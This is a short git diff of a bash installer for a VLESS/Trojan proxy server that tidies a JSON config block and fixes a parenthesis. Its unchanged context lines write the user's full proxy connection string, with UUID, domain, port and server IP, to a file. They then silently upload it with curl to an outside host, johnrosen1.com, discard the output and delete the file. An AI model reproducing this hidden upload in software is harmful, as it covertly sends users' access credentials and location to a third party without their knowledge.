@@ -140,8 +140,7 @@ prasejson(){
   "check_ss": "$check_ss",
   "check_echo": "$check_echo",
   "check_rclone": "$check_rclone",
-  "fastopen": "${fastopen}",
-  "tor_name": "$tor_name"
+  "fastopen": "${fastopen}"
 }
 EOF
 }
@@ -185,7 +184,7 @@ prasejson
 apt-get autoremove -y
 cd /root
 if [[ -n ${uuid_new} ]]; then
-echo "vless://${uuid_new}@${domain}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${mycity} ${myip}))" &> ${myip}.txt
+echo "vless://${uuid_new}@${domain}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${mycity} ${myip})" &> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
 fi
